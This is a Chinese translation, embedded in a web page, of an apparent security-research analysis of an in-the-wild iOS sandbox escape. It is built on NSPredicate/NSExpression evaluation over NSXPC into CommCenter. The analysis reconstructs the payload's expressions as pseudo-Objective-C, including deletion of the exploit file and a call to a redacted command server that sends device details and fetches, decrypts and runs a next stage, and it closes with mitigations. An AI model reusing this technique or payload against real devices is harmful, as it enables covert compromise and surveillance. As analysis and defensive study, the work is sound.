+<p>heap 能够确定泄漏的内存包含 JBIG2Bitmap 对象。</p>
+<p>使用 -address 选项，我们可以找到所有单独泄漏的位图对象：</p>
+<p>$ heap -address JBIG2Bitmap $pid</p>
+<p>并将它们转储到文件中。其中一个对象与其他对象截然不同：</p>
+<p>$ hexdump -C dumpXX.bin | head</p>
+<p>00000000  62 70 6c 69 73 74 30 30  |bplist00|<br>...<br>00000018        24 76 65 72 73 69  |  $versi|<br>00000020  6f 6e 59 24 61 72 63 68  |onY$arch|<br>00000028  69 76 65 72 58 24 6f 62  |iverX$ob|<br>00000030  6a 65 63 74 73 54 24 74  |jectsT$t|<br>00000038  6f 70                    |op      |<br>00000040        4e 53 4b 65 79 65  |  NSKeye|<br>00000048  64 41 72 63 68 69 76 65  |dArchive|</p>
+<p>这显然是一个序列化的 NSKeyedArchiver。这绝对不是你在 JBIG2Bitmap 对象中期望看到的东西。运行 strings 命令，我们看到许多有趣的东西（注意下面的 URL 已编辑）：</p>
+<p>Objective-C 类名和选择器名：</p>
+<p>NSFunctionExpression<br>NSConstantValueExpression<br>NSConstantValue<br>expressionValueWithObject:context:<br>filteredArrayUsingPredicate:<br>_web_removeFileOnlyAtPath:<br>context:evaluateMobileSubscriberIdentity:<br>performSelectorOnMainThread:withObject:waitUntilDone:<br>...</p>
+<p>用于投递 exploit 的文件名：</p>
+<p>XXX.gif</p>
+<p>文件系统路径：</p>
+<p>/tmp/com.apple.messages<br>/System/Library/PrivateFrameworks/SlideshowKit.framework/Frameworks/OpusFoundation.framework</p>
+<p>一个 URL：</p>
+<p><a href="https://XXX.cloudfront.net/YYY/ZZZ/megalodon?AAA">https://XXX.cloudfront.net/YYY/ZZZ/megalodon?AAA</a></p>
+<p>使用 plutil 我们可以将 bplist00 二进制格式转换为 XML。经过一些后处理和清理，我们可以看到 NSKeyedArchiver 中的顶层对象是一个序列化的 NSFunctionExpression 对象。</p>
+<h2 id="nsexpression-nspredicate-nsexpression">NSExpression NSPredicate NSExpression</h2><p>如果你曾经使用过 Core Data 或尝试过滤 Objective-C 集合，你可能遇到过 NSPredicates。根据苹果的公开文档，它们用于&quot;定义逻辑条件以约束搜索或内存过滤&quot;。</p>
+<p>例如，在 Objective-C 中，你可以像这样过滤一个 NSArray 对象：</p>
+<p>NSArray* names = @[@&quot;one&quot;, @&quot;two&quot;, @&quot;three&quot;];<br>NSPredicate* pred;<br>pred = [NSPredicate predicateWithFormat:<br>        @&quot;SELF beginswith[c] &#39;t&#39;&quot;];<br>NSLog(@&quot;%@&quot;, [names filteredArrayUsingPredicate:pred]);</p>
+<p>谓词是 &quot;SELF beginswith[c] &#39;t&#39;&quot;。这将打印一个只包含 &quot;two&quot; 和 &quot;three&quot; 的 NSArray。</p>
+<p>[NSPredicate predicateWithFormat] 通过解析一种小型查询语言来构建谓词对象，有点像 SQL 查询。</p>
+<p>NSPredicates 可以由 NSExpressions 构建，并通过 NSComparisonPredicates（如小于、大于等）连接。</p>
+<p>NSExpressions 本身可以相当复杂，包含聚合表达式（如 &quot;IN&quot; 和 &quot;CONTAINS&quot;）、子查询、集合表达式，以及最有趣的是函数表达式。</p>
+<p>在 2007 年之前（在 OS X 10.4 及更早版本中），函数表达式仅限于以下五个额外的内置方法：sum、count、min、max 和 average。</p>
+<p>但从 OS X 10.5 开始（这也大约是 2007 年 iOS 推出的时候），NSFunctionExpressions 被扩展为允许使用 FUNCTION 关键字进行任意方法调用：</p>
+<p>&quot;FUNCTION(&#39;abc&#39;, &#39;stringByAppendingString&#39;, &#39;def&#39;)&quot; =&gt; @&quot;abcdef&quot;</p>
+<p>FUNCTION 接受一个目标对象、一个选择器和一个可选的参数列表，然后在对象上调用该选择器，传递参数。在这种情况下，它将分配一个 NSString 对象 @&quot;abc&quot;，然后调用 stringByAppendingString: 选择器，传递 NSString @&quot;def&quot;，这将求值为 NSString @&quot;abcdef&quot;。</p>
+<p>除了 FUNCTION 关键字，还有 CAST，它允许基于反射的完全访问所有 Objective-C 类型（而不仅仅是能够在字面字符串和整数上调用选择器）：</p>
+<p>&quot;FUNCTION(CAST(&#39;NSFileManager&#39;, &#39;Class&#39;), &#39;defaultManager&#39;)&quot;</p>
+<p>这里我们可以访问 NSFileManager 类并调用 defaultManager 选择器来获取对进程共享文件管理器实例的引用。</p>
+<p>这些关键字存在于 NSPredicates 和 NSExpressions 的字符串表示中。解析这些字符串涉及创建 NSExpression 对象、NSPredicate 对象及其子类（如 NSFunctionExpression）的图。JBIG2 位图中存在的正是这样一个图的序列化版本。</p>
+<p>使用 FUNCTION 关键字的 NSPredicates 实际上是 Objective-C 脚本。通过一些技巧，可以构建嵌套的函数调用，几乎可以做任何在过程式 Objective-C 中能做的事情。弄清楚其中一些技巧是 2019 年 Real World CTF DezhouInstrumenz 挑战的关键，该挑战会评估攻击者提供的 NSExpression 格式字符串。挑战作者的 writeup 是这些想法的绝佳介绍，如果你还没读过，我强烈建议你现在就去读一下。本文的其余部分建立在该文章中描述的技巧之上。</p>
+<h2 id="两部分的故事">两部分的故事</h2><p>上一篇博客文章中描述的 JBIG2 逻辑门机器的唯一工作是导致嵌入的 NSFunctionExpression 的反序列化和求值。没有尝试获取本地代码执行、ROP、JOP 或任何类似技术。</p>
+<p>在 iOS 14.5 之前，Objective-C 对象的 isa 字段不受指针认证码（PAC）保护，因此 JBIG2 机器构建了一个带有伪造 isa 的虚假 Objective-C 对象，使得 dealloc 选择器的调用导致 NSFunctionExpression 的反序列化和求值。这与 Samuel 在 2020 年 SLOP 文章中使用的技术非常相似。</p>
+<p>这个 NSFunctionExpression 有两个目的：</p>
+<p>首先，它分配并泄漏一个 ASMKeepAlive 对象，然后尝试通过查找并删除投递 exploit 的 .gif 文件来掩盖其踪迹。</p>
+<p>其次，它构建一个有效载荷 NSPredicate 对象，然后触发一个逻辑漏洞，使该 NSPredicate 对象在 CommCenter 进程中被求值，该进程可通过 com.apple.commcenter.xpc NSXPC 服务从 IMTranscoderAgent 沙箱访问。</p>
+<p>让我们分别看看这两部分：</p>
+<h2 id="掩盖踪迹">掩盖踪迹</h2><p>外层 NSFunctionExpression 调用 performSelectorOnMainThread:withObject:waitUntilDone，后者又在一个包含四个 NSFunctionExpressions 的 NSArray 上调用 makeObjectsPerformSelector:@&quot;expressionValueWithObject:context:&quot;。这允许依次求值四个独立的 NSFunctionExpressions。</p>
+<p>通过一些手动清理，我们可以恢复序列化 NSFunctionExpressions 的伪 Objective-C 版本。</p>
+<p>第一个做这个：</p>
+<p>[[AMSKeepAlive alloc] initWithName:&quot;KA&quot;]</p>
+<p>这分配然后泄漏一个 AppleMediaServices KeepAlive 对象。其确切目的尚不清楚。</p>
+<p>第二个条目做这个：</p>
+<p>[[NSFileManager defaultManager] _web_removeFileOnlyAtPath:<br> [@&quot;/tmp/com.apple.messages&quot; stringByAppendingPathComponent:<br>  [ [ [ [<br>        [NSFileManager defaultManager]<br>        enumeratorAtPath: @&quot;/tmp/com.apple.messages&quot;<br>        ]<br>       allObjects<br>       ]<br>      filteredArrayUsingPredicate:<br>      [<br>        [NSPredicate predicateWithFormat:<br>         [<br>          [@&quot;SELF ENDSWITH &#39;&quot;<br>           stringByAppendingString: &quot;XXX.gif&quot;]<br>          stringByAppendingString: &quot;&#39;&quot;<br>          ]   ] ] ]<br>     firstObject<br>     ]<br>  ]<br> ]</p>
+<p>阅读这些单一表达式的 NSFunctionExpressions 有点棘手；将其分解为更过程化的形式，它等同于：</p>
+<p>NSFileManager* fm = [NSFileManager defaultManager];<br>NSDirectoryEnumerator* dir_enum;<br>dir_enum = [fm enumeratorAtPath: @&quot;/tmp/com.apple.messages&quot;]<br>NSArray* allTmpFiles = [dir_enum allObjects];<br>NSString* filter;<br>filter = [&quot;@&quot;SELF ENDSWITH &#39;&quot; stringByAppendingString: &quot;XXX.gif&quot;];<br>filter = [filter stringByAppendingString: &quot;&#39;&quot;];<br>NSPredicate* pred;<br>pred = [NSPredicate predicateWithFormat: filter]<br>NSArray* matches;<br>matches = [allTmpFiles filteredArrayUsingPredicate: pred];<br>NSString* gif_subpath = [matches firstObject];<br>NSString* root = @&quot;/tmp/com.apple.messages&quot;;<br>NSString* full_path;<br>full_path = [root stringByAppendingPathComponent: gifSubpath];<br>[fm _web_removeFileOnlyAtPath: full_path];</p>
+<p>这会找到 iMessage 存储在 /tmp/com.apple.messages 文件夹下某处的用于投递 exploit 的 XXX.gif 文件并删除它。</p>
+<p>另外两个 NSFunctionExpressions 构建一个有效载荷，然后在 CommCenter 中触发其求值。为此，我们需要看看 NSXPC。</p>
+<h2 id="nsxpc">NSXPC</h2><p>NSXPC 是一种用于 Objective-C 的半透明远程过程调用机制。它允许在一个进程中实例化代理对象，这些对象透明地将方法调用转发到另一个进程中的&quot;真实&quot;对象：</p>
+<p><img src="/images/1599f0e02eb8/7f6e2c8571075ae9a214aa44e7c12ae1.png" alt="" loading="lazy"></p>
+<p><a href="https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html">https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html</a></p>
+<p>我说 NSXPC 只是半透明的，因为它确实对允许哪些对象跨越进程边界施加了一些限制。任何通过 NSXPC &quot;导出&quot;的对象还必须定义一个协议（protocol），该协议指定可以调用哪些方法以及每个参数的允许类型。NSXPC 编程指南进一步解释了需要集合的方法和其他边缘情况所需的额外处理。</p>
+<p>NSXPC 使用的底层序列化与 Natalie Silvanovich 在 2019 年博客文章中探讨的相同，该文章研究了 iPhone 的完全远程攻击面。该文章中的一个重要观察是，具有任何级别继承的类的子类也是允许的，NSKeyedUnarchiver 反序列化总是如此。</p>
+<p>这意味着，任何为字段声明特定类型的协议对象，根据设计，也将接受该类型的任何子类。</p>
+<p>这种逻辑的极端情况是，声明参数类型为 NSObject 的协议将允许任何子类，而这是绝大多数 Objective-C 类。</p>
+<h2 id="grep-来救援">Grep 来救援</h2><p>这很容易自动分析。协议是静态定义的，所以我们可以直接找到它们并检查每一个。像 RuntimeBrowser 和 classdump 这样的工具可以解析静态协议定义并输出人类可读的源代码。像这样 grep RuntimeBrowser 的输出足以找到数十个 Objective-C 协议中 NSObject 指针的情况：</p>
+<p>$ egrep -Rn &quot;(NSObject *)arg&quot; *</p>
+<p>并非所有结果都必然通过 NSXPC 暴露，但有些显然是，包括 CoreTelephony.framework 中的以下两个匹配项：</p>
+<p>Frameworks/CoreTelephony.framework/<br>CTXPCServiceSubscriberInterface-Protocol.h:39:<br>-(void)evaluateMobileSubscriberIdentity:<br>(CTXPCServiceSubscriptionContext *)arg1<br>identity:(NSObject *)arg2<br>completion:(void (^)(NSError *))arg3;</p>
+<p>Frameworks/CoreTelephony.framework/<br>CTXPCServiceCarrierBundleInterface-Protocol.h:13:<br>-(void)setWiFiCallingSettingPreferences:<br>(CTXPCServiceSubscriptionContext *)arg1<br>key:(NSString *)arg2<br>value:(NSObject *)arg3<br>completion:(void (^)(NSError *))arg4;</p>
+<p>evaluateMobileSubscriberIdentity 字符串出现在我们最初在 bplist00 上运行 strings 时看到的类似选择器的字符串列表中。确实，查看解析并美化的 NSFunctionExpression，我们看到它这样做：</p>
+<p>[ [ [CoreTelephonyClient alloc] init]<br> context:X<br> evaluateMobileSubscriberIdentity:Y]</p>
+<p>这是对底层 NSXPC 代码的包装，上面传递给 CoreTelephonyClient 方法的参数 Y 对应于通过 NSXPC 传递给 CommCenter（托管 com.apple.commcenter.xpc 的进程，这是 CoreTelephonyClient 底层的 NSXPC 服务）的 identity:(NSObject <em>)arg2 参数。由于参数明确命名为 NSObject</em>，我们实际上可以传递 NSObject* 的任何子类，包括 NSPredicate！游戏结束？</p>
+<h2 id="解析与求值">解析与求值</h2><p>这并不那么容易。DezhouInstrumentz writeup 讨论了这种攻击面，并指出有一个额外的、特定的缓解措施。当 NSPredicate 被其 initWithCoder: 实现反序列化时，它会设置一个标志，禁用谓词的求值，直到调用 allowEvaluation 方法。</p>
+<p>因此，虽然你当然可以将 NSPredicate* 作为 identity 参数通过 NSXPC 传递，并在 CommCenter 中获取其反序列化，但 CommCenter 中 evaluateMobileSubscriberIdentity: 的实现肯定不会调用 allowEvaluation: 来使谓词安全求值，然后调用 evaluateWithObject: 并求值它。</p>
+<h2 id="旧技术-新技巧">旧技术，新技巧</h2><p>从 exploit 中我们可以看到，他们实际上传递了一个包含两个元素的 NSArray：</p>
+<p>[0] = AVSpeechSynthesisVoice<br>[1] = PTSection {rows = NSArray { [0] = PTRow() }</p>
+<p>第一个元素是一个 AVSpeechSynthesisVoice 对象，第二个是一个包含单个 PTRow 的 PTSection。为什么？</p>
+<p>PTSection 和 PTRow 都在私有框架 PrototypeTools 中定义。PrototypeTools 没有加载到 CommCenter 目标进程中。让我们看看当 AVSpeechSynthesisVoice 被反序列化时会发生什么：</p>
+<h2 id="寻找一个声音">寻找一个声音</h2><p>AVSpeechSynthesisVoice 在 AVFAudio.framework 中实现，该框架已加载到 CommCenter 中：</p>
+<p>$ sudo vmmap pgrep CommCenter | grep AVFAudio</p>
+<p>__TEXT  7ffa22c4c000-7ffa22d44000 r-x/r-x SM=COW <br>/System/Library/Frameworks/AVFAudio.framework/Versions/A/AVFAudio</p>
+<p>假设这是 CommCenter 内部首次创建 AVSpeechSynthesisVoice 对象（这很有可能），Objective-C 运行时将在实例化第一个实例之前调用 AVSpeechSynthesisVoice 类的 initialize 方法。</p>
+<p>[AVSpeechSynthesisVoice initialize] 有一个 dispatch_once 块，包含以下代码：</p>
+<p>NSBundle* bundle;<br>bundle = [NSBundle bundleWithPath:<br>          @&quot;/System/Library/AccessibilityBundles/<br>AXSpeechImplementation.bundle&quot;];<br>if (![bundle isLoaded]) {<br>  NSError err;<br>  [bundle loadAndReturnError:&amp;err]<br>}</p>
+<p>因此，发送一个序列化的 AVSpeechSynthesisVoice 对象将导致 CommCenter 加载 /System/Library/AccessibilityBundles/AXSpeechImplementation.bundle 库。使用 otool -L 列出依赖项进行一些脚本编写，我们可以找到从 AXSpeechImplementation.bundle 到 PrototypeTools.framework 的以下依赖链：</p>
+<p>[&#39;/System/Library/AccessibilityBundles/<br>AXSpeechImplementation.bundle/AXSpeechImplementation&#39;,<br> &#39;/System/Library/AccessibilityBundles/<br>AXSpeechImplementation.bundle/AXSpeechImplementation&#39;,<br> &#39;/System/Library/PrivateFrameworks/<br>AccessibilityUtilities.framework/AccessibilityUtilities&#39;,<br> &#39;/System/Library/PrivateFrameworks/<br>AccessibilitySharedSupport.framework/AccessibilitySharedSupport&#39;,<br> &#39;/System/Library/PrivateFrameworks/Sharing.framework/Sharing&#39;,<br> &#39;/System/Library/PrivateFrameworks/<br>PrototypeTools.framework/PrototypeTools&#39;]</p>
+<p>这解释了 PTSection 的反序列化将如何成功。但 PTSections 和 PTRows 有什么特别之处呢？</p>
+<h2 id="带谓词的节">带谓词的节</h2><p>[PTRow initwithcoder:] 包含以下代码片段：</p>
+<p>self-&gt;condition = [coder decodeObjectOfClass:NSPredicate<br>                                      forKey:@&quot;condition&quot;]<br>[self-&gt;condition allowEvaluation]</p>
+<p>这将反序列化一个 NSPredicate 对象，将其分配给 PTRow 成员变量 condition 并调用 allowEvaluation。这旨在表明反序列化代码认为此谓词是安全的，但这里没有尝试对谓词内容执行任何验证。然后他们还需要一个技巧来找到一条路径，该路径将额外求值 PTRow 的条件谓词。</p>
+<p>以下是 [PTSection initWithCoder:] 的代码片段：</p>
+<p>NSSet* allowed = [NSSet setWithObjects: @[PTRow]]<br>id* rows = [coder decodeObjectOfClasses:allowed forKey:@&quot;rows&quot;]<br>[self initWithRows:rows]</p>
+<p>这反序列化一个 PTRows 数组，并将它们传递给 [PTSection initWithRows]，后者将 PTRows 数组的副本分配给 PTSection-&gt;rows，然后调用 [self _reloadEnabledRows]，后者又将每一行传递给 [self _shouldEnableRow:]</p>
+<p>_shouldEnableRow:row {<br>  if (row-&gt;condition) {<br>    return [row-&gt;condition evaluateWithObject: self-&gt;settings]<br>  }<br>}</p>
+<p>因此，通过发送一个包含单个附加了条件 NSPredicate 的 PTRow 的 PTSection，他们可以导致任意 NSPredicate 的求值，这实际上等同于在 CommCenter 上下文中的任意代码执行。</p>
+<h2 id="有效载荷-2">有效载荷 2</h2><p>附加到 PTRow 的 NSPredicate 使用与第一个有效载荷类似的技巧，导致六个独立的 NSFunctionExpressions 的求值，但这次是在 CommCenter 进程的上下文中。它们在这里以伪 Objective-C 形式呈现：</p>
+<h3 id="表达式-1">表达式 1</h3><p>[  [CaliCalendarAnonymizer sharedAnonymizedStrings]<br>   setObject:<br>   @[[NSURLComponents<br>      componentsWithString:<br>      @&quot;<a href="https://cloudfront.net/XXX/XXX/XXX?aaaa%22%5D">https://cloudfront.net/XXX/XXX/XXX?aaaa&quot;]</a>, &#39;0&#39;]<br>   forKey: @&quot;0&quot;<br> ]</p>
+<p>使用 [CaliCalendarAnonymizer sharedAnonymizedStrings] 是一个技巧，使独立的 NSFunctionExpressions 数组能够拥有&quot;局部变量&quot;。在第一种情况下，他们创建一个 NSURLComponents 对象，用于构建参数化 URL。然后，这个 URL 构建器存储在 [CaliCalendarAnonymizer sharedAnonymizedStrings] 返回的全局字典中，键为 &quot;0&quot;。</p>
+<h3 id="表达式-2">表达式 2</h3><p>[[NSBundle<br>  bundleWithPath:@&quot;/System/Library/PrivateFrameworks/<br>SlideshowKit.framework/Frameworks/OpusFoundation.framework&quot;<br>  ] load]</p>
+<p>这导致加载 OpusFoundation 库。确切原因尚不清楚，尽管 OpusFoundation 的依赖图确实包含下一个 NSFunctionExpression 使用的 AuthKit。这个有效载荷可能是通用的，也可能期望在未加载 AuthKit 的进程中被求值时也能工作。</p>
+<h3 id="表达式-3">表达式 3</h3><p>[ [ [CaliCalendarAnonymizer sharedAnonymizedStrings]<br>    objectForKey:@&quot;0&quot; ]<br>  setQueryItems:<br>  [ [ [NSArray arrayWithObject:<br>        [NSURLQueryItem<br>         queryItemWithName: @&quot;m&quot;<br>         value:[AKDevice _hardwareModel] ]<br>        ] arrayByAddingObject:<br>        [NSURLQueryItem<br>         queryItemWithName: @&quot;v&quot;<br>         value:[AKDevice _buildNumber] ]<br>      ] arrayByAddingObject:<br>      [NSURLQueryItem<br>       queryItemWithName: @&quot;u&quot;<br>       value:[NSString randomString]]<br>    ]<br> ]</p>
+<p>这获取对存储在全局 sharedAnonymizedStrings 字典中键 &quot;0&quot; 下的 NSURLComponents 对象的引用，然后用三个值参数化 HTTP 查询字符串：</p>
+<p>[AKDevice _hardwareModel] 返回一个像 &quot;iPhone12,3&quot; 这样的字符串，用于确定确切的设备型号。</p>
+<p>[AKDevice _buildNumber] 返回一个像 &quot;18A8395&quot; 这样的字符串，结合设备型号，可以确定设备上运行的确切固件映像。</p>
+<p>[NSString randomString] 返回一个 32 位随机整数的十进制字符串表示，如 &quot;394681493&quot;。</p>
+<h3 id="表达式-4">表达式 4</h3><p>[ [CaliCalendarAnonymizer sharedAnonymizedString]<br>  setObject:<br>  [NSPropertyListSerialization<br>   propertyListWithData:<br>   [[[NSData<br>       dataWithContentsOfURL:<br>       [[[CaliCalendarAnonymizedStrings sharedAnonymizedStrings]<br>          objectForKey:@&quot;0&quot;] URL]<br>       ] AES128DecryptWithPassword:NSData(XXXX)<br>     ]  decompressedDataUsingAlgorithm:3 error:]<br>   options: Class(NSConstantValueExpression)<br>   format: Class(NSConstantValueExpression)<br>   errors:Class(NSConstantValueExpression)<br>   ]<br>  forKey:@&quot;1&quot;<br> ]</p>
+<p>这里对 sharedAnonymizedStrings 的最内层引用获取 NSURLComponents 对象，并根据之前设置的查询字符串参数构建完整的 URL。该 URL 被传递给 [NSData dataWithContentsOfURL:] 以从远程服务器获取数据块。</p>
+<p>该数据块使用硬编码的 AES128 密钥解密，使用 zlib 解压缩，然后解析为 plist。解析后的 plist 存储在 sharedAnonymizedStrings 字典中，键为 &quot;1&quot;。</p>
+<h3 id="表达式-5">表达式 5</h3><p>[ [[NSThread mainThread] threadDictionary]<br>  addEntriesFromDictionary:<br>  [[CaliCalendarAnonymizer sharedAnonymizedStrings]<br>   objectForKey:@&quot;1&quot;]<br> ]</p>
+<p>这将所有键和值从&quot;下一阶段&quot; plist 复制到主线程的 threadDictionary 中。</p>
+<h3 id="表达式-6">表达式 6</h3><p>[ [NSExpression expressionWithFormat:<br>   [[[CaliCalendarAnonymizer sharedAnonymizedStrings]<br>     objectForKey:@&quot;1&quot;]<br>    objectForKey: @&quot;a&quot;]<br>   ]<br>  expressionValueWithObject:nil context:nil<br> ]</p>
+<p>最后，这从下一阶段 plist 中获取键 &quot;a&quot; 的值，将其解析为 NSExpression 字符串并进行求值。</p>
+<h2 id="终点">终点</h2><p>此时，我们失去了跟踪 exploit 的能力。攻击者已经逃逸了 IMTranscoderAgent 沙箱，向命令和控制服务器请求了下一阶段并执行了它，所有这些都没有任何内存损坏或依赖于特定版本的操作系统。</p>
+<p>作为对此 exploit 的回应，iOS 15.1 显著减少了 NSExpressions 可用的计算能力：</p>
+<p>NSExpression 立即禁止某些具有显著副作用的操作，如创建和销毁对象。此外，使用 NSConstantValueExpression 将字符串类名转换为 Class 对象已被弃用。</p>
+<p>此外，PTSection 和 PTRow 对象已得到加固，在解析序列化 NSPredicates 时添加了以下检查：</p>
+<p>if (os_variant_allows_internal_security_policies(<br>      &quot;com.apple.PrototypeTools&quot;) {<br>  [coder decodeObjectOfClass:NSPredicate forKey:@&quot;condition]<br>  ...</p>
+<p>然而，跨越信任边界的对象反序列化仍然呈现出一个巨大的攻击面。</p>
+<h2 id="结论">结论</h2><p>也许最引人注目的收获是，从一个希望是相当受限的沙箱中可访问的攻击面的深度。仅凭两个技巧（协议中的 NSObject 指针和库加载小工具），就可能攻击 dyld_shared_cache 中几乎每个 initWithCoder 实现。除了 NSPredicate 和 NSExpression 之外，可能还有许多其他类提供了逻辑风格 exploit 的构建块。</p>
+<p>NSXPC 的表达能力似乎从根本上不适合在沙箱边界之间使用，尽管它正是为此而设计的。从沙箱内部可访问的攻击面应该是最小的、可枚举的和可审查的。理想情况下，只有正确功能所需的代码才应该是可访问的；应该能够准确确定暴露的代码是什么，并且暴露的代码量应该足够小，以便手动审查是可行的。</p>
+<p>NSXPC 要求开发人员将远程暴露的方法显式添加到接口协议中，这是使攻击面可枚举的一个很好的例子——你至少可以相当容易地找到所有入口点。然而，对继承的支持意味着那里暴露的攻击面可能不可审查；对于任何超出基本示例的情况来说，它都太大了。</p>
+<p>重构这些关键的 IPC 边界，使其更具规范性——在这种情况下只允许更窄的一组对象——将是使攻击面可审查的良好一步。这可能需要对 NSXPC 进行相当重大的重构；它是围绕原生支持 Objective-C 继承模型构建的，并且使用非常广泛。但如果没有这样的改变，暴露的攻击面就太大了，无法有效审计。</p>
+<p>内存标记扩展（MTE）的出现，很可能在今年在 ARM 生态系统的多个消费设备中推出，是防御内存损坏利用的一大步。但攻击者也在创新，并且可能已经领先两步，重新关注逻辑漏洞。这个沙箱逃逸 exploit 很可能标志着如果 MTE 的承诺能够实现，我们预计在未来几年将看到的转变。而这个 exploit 比几乎任何内存损坏 exploit 所希望达到的更具扩展性、可靠性和通用性。</p>
+
+        </div>
+        
+  <div class="post-tags">
+    <span>标签:</span>
+    <a href="/tag/PDF安全.html" class="tag-link">#PDF安全</a> <a href="/tag/堆漏洞.html" class="tag-link">#堆漏洞</a> <a href="/tag/安全研究.html" class="tag-link">#安全研究</a> <a href="/tag/Web安全.html" class="tag-link">#Web安全</a> <a href="/tag/内存安全.html" class="tag-link">#内存安全</a> <a href="/tag/macOS安全.html" class="tag-link">#macOS安全</a> <a href="/tag/iOS安全.html" class="tag-link">#iOS安全</a> <a href="/tag/WiFi安全.html" class="tag-link">#WiFi安全</a>
+  </div>
+  
+        
+  <div class="adsense adsense-bottom">
+    <ins class="adsbygoogle"
+         style="display:block"
+         data-ad-client="ca-pub-1206611804757181"
+         data-ad-slot="4232191576"
+         data-ad-format="auto"
+         data-full-width-responsive="true"></ins>
+    <script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+  </div>
+  
+      </article>
+      
+    <nav class="post-toc">
+      <div class="toc-title">目录</div>
+      <ul class="toc-list">
+        
+          <li class="toc-item toc-level-0">
+            <a href="#一个观察" class="toc-link">
+              <span class="toc-text">一个观察</span>
+              
+            </a>
+            
+          </li>
+        
+          <li class="toc-item toc-level-0">
+            <a href="#nsexpression-nspredicate-nsexpression" class="toc-link">
+              <span class="toc-text">NSExpression NSPredicate NSExpression</span>
+              
+            </a>
+            
+          </li>
+        
+          <li class="toc-item toc-level-0">
+            <a href="#两部分的故事" class="toc-link">
+              <span class="toc-text">两部分的故事</span>
+              
+            </a>
+            
+          </li>
+        
+          <li class="toc-item toc-level-0">
+            <a href="#掩盖踪迹" class="toc-link">
+              <span class="toc-text">掩盖踪迹</span>
+              
+            </a>
+            
+          </li>
+        
+          <li class="toc-item toc-level-0">
+            <a href="#nsxpc" class="toc-link">
+              <span class="toc-text">NSXPC</span>
+              
+            </a>
+            
+          </li>
+        
+          <li class="toc-item toc-level-0">
+            <a href="#grep-来救援" class="toc-link">
+              <span class="toc-text">Grep 来救援</span>
+              
+            </a>
+            
+          </li>
+        
+          <li class="toc-item toc-level-0">
+            <a href="#解析与求值" class="toc-link">
+              <span class="toc-text">解析与求值</span>
+              
+            </a>
+            
+          </li>
+        
+          <li class="toc-item toc-level-0">
+            <a href="#旧技术-新技巧" class="toc-link">
+              <span class="toc-text">旧技术，新技巧</span>
+              
+            </a>
+            
+          </li>
+        
+          <li class="toc-item toc-level-0">
+            <a href="#寻找一个声音" class="toc-link">
+              <span class="toc-text">寻找一个声音</span>
+              
+            </a>
+            
+          </li>
+        
+          <li class="toc-item toc-level-0">
+            <a href="#带谓词的节" class="toc-link">
+              <span class="toc-text">带谓词的节</span>
+              
+            </a>
+            
+          </li>
+        
+          <li class="toc-item toc-level-0 has-children">
+            <a href="#有效载荷-2" class="toc-link">
+              <span class="toc-text">有效载荷 2</span>
+              
+                <button class="toc-fold-btn" onclick="toggleTocSection(this)" title="折叠/展开">
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <polyline points="6 9 12 15 18 9"></polyline>
+                  </svg>
+                </button>
+              
+            </a>
+            
+              <ul class="toc-sublist">
+                
+                  <li class="toc-item toc-level-1">
+                    <a href="#表达式-1" class="toc-link">表达式 1</a>
+                  </li>
+                
+                  <li class="toc-item toc-level-1">
+                    <a href="#表达式-2" class="toc-link">表达式 2</a>
+                  </li>
+                
+                  <li class="toc-item toc-level-1">
+                    <a href="#表达式-3" class="toc-link">表达式 3</a>
+                  </li>
+                
+                  <li class="toc-item toc-level-1">
+                    <a href="#表达式-4" class="toc-link">表达式 4</a>
+                  </li>
+                
+                  <li class="toc-item toc-level-1">
+                    <a href="#表达式-5" class="toc-link">表达式 5</a>
+                  </li>
+                
+                  <li class="toc-item toc-level-1">
+                    <a href="#表达式-6" class="toc-link">表达式 6</a>
+                  </li>
+                
+              </ul>
+            
+          </li>
+        
+          <li class="toc-item toc-level-0">
+            <a href="#终点" class="toc-link">
+              <span class="toc-text">终点</span>
+              
+            </a>
+            
+          </li>
+        
+          <li class="toc-item toc-level-0">
+            <a href="#结论" class="toc-link">
+              <span class="toc-text">结论</span>
+              
+            </a>
+            
+          </li>
+        
+      </ul>
+    </nav>
+    
+    </div>
+  </main>
+  
+  <div class="adsense adsense-floating adsense-floating-left">
+    <ins class="adsbygoogle"
+         style="display:block; width:160px; height:600px"
+         data-ad-client="ca-pub-1206611804757181"
+         data-ad-slot="4232191576"
+         data-ad-format="vertical"
+         data-full-width-responsive="false"></ins>
+    <script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+  </div>
+  
+  
+  
+  <footer class="site-footer">
+    <div class="footer-container">
+      <div class="footer-content">
+        <p>&copy; 2026 BasicBit. All rights reserved.</p>
+        <p>安全逆向技术文章博客</p>
+      </div>
+    </div>
+  </footer>
+  <script>document.addEventListener('DOMContentLoaded',function(){const menuToggle=document.querySelector('.mobile-menu-btn');const siteNav=document.querySelector('.site-nav');if(menuToggle&&siteNav){menuToggle.addEventListener('click',function(){const isExpanded=this.getAttribute('aria-expanded')==='true';this.setAttribute('aria-expanded',!isExpanded);siteNav.classList.toggle('active');});}const mobileSearchBtn=document.querySelector('.mobile-search-btn');const mobileSearchModal=document.querySelector('.mobile-search-modal');const mobileSearchClose=document.querySelector('.mobile-search-close');const mobileSearchInput=document.querySelector('.mobile-search-input');if(mobileSearchBtn&&mobileSearchModal){mobileSearchBtn.addEventListener('click',function(){mobileSearchModal.classList.add('active');mobileSearchBtn.setAttribute('aria-expanded','true');if(mobileSearchInput){setTimeout(()=>mobileSearchInput.focus(),100);}});if(mobileSearchClose){mobileSearchClose.addEventListener('click',function(){mobileSearchModal.classList.remove('active');mobileSearchBtn.setAttribute('aria-expanded','false');});}mobileSearchModal.addEventListener('click',function(e){if(e.target===mobileSearchModal){mobileSearchModal.classList.remove('active');mobileSearchBtn.setAttribute('aria-expanded','false');}});document.addEventListener('keydown',function(e){if(e.key==='Escape'&&mobileSearchModal.classList.contains('active')){mobileSearchModal.classList.remove('active');mobileSearchBtn.setAttribute('aria-expanded','false');}});}document.querySelectorAll('a[href^="#"]').forEach(anchor=>{anchor.addEventListener('click',function(e){const href=this.getAttribute('href');if(href !=='#'){e.preventDefault();const target=document.querySelector(href);if(target){target.scrollIntoView({behavior:'smooth'});}}});});const searchInput=document.querySelector('.search-input');if(searchInput){searchInput.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();const 